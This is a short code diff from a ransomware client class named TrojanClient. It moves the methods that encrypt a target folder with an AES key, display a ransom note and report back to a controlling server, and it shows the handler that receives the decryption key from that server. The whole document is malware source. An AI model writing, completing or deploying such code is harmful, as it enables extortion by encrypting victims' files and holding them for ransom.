@@ -118,6 +118,18 @@ class TrojanClient:
         self.folder = folder
         self.connection = conn
 
+    def encryption(self, aes_key):
+        FileEncryptor.encrypt_folder(self.folder, aes_key)
+        del aes_key
+        RansomNote.display_encryption_note()
+        protocol.send(self.connection, "the files are encrypted")
+    
+    def decryption(self, aes_key):
+        FileEncryptor.decrypt_folder(self.folder, aes_key)
+        del aes_key
+        RansomNote.display_decryption_note()
+        protocol.send(self.connection, "the files are decrypted")
+
     def handle_server(self):
         # option 1:
         
@@ -151,25 +163,12 @@ class TrojanClient:
         if (msg_decode != "sending decryption key"):
             raise ValueError("unexpected message")
 
-
         aes_key = protocol.receive(self.connection)
 
         #decrepption
         self.decryption(self, aes_key)
         
         sys.exit()
-        
-    def encryption(self, aes_key):
-        FileEncryptor.encrypt_folder(self.folder, aes_key)
-        del aes_key
-        RansomNote.display_encryption_note()
-        protocol.send(self.connection, "the files are encrypted")
-    
-    def decryption(self, aes_key):
-        FileEncryptor.decrypt_folder(self.folder, aes_key)
-        del aes_key
-        RansomNote.display_decryption_note()
-        protocol.send(self.connection, "the files are decrypted")
 
 
 
